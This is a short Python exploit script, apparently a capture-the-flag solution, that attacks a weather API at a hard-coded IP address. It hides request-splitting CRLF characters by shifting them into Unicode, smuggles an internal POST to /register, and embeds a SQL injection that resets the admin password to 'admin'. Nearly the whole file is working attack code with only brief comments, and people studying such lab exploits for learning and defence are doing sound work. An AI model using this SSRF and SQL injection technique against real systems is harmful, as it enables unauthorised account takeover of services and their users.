
import requests

def conceal_payload(payload_raw: str) -> str:
    """SSRF payload generator: converts payload to unicode symbols"""
    return ''.join(chr(ord(symbol) + 0x100) for symbol in payload_raw)

# Username and password contain SQL injection which resets the admin password to 'admin'
username = 'admin'
password = "123') ON CONFLICT(username) DO UPDATE SET password='admin' where username='admin'; --"

# Raw http strings constituting the payload that exploits the SSRF vulnerability via request splitting
finish_get = " HTTP/1.1\r\nHost:127.0.0.1\r\n\r\n"
http_content = f"username={username}&password={password}"
malicious_post = f"POST /register HTTP/1.1\r\nHost:127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {len(http_content)}\r\n\r\n{http_content}\r\n\r\n"
begin_get = "GET /ab"
payload = "127.0.0.1/" + conceal_payload(finish_get + malicious_post + begin_get)

# Payload is sent to the server
data = {
    "endpoint": payload,
    "city":"city",
    "country":"country"}
res = requests.post("http://46.101.9.98:30886/api/weather", data=data)
print(res.status_code)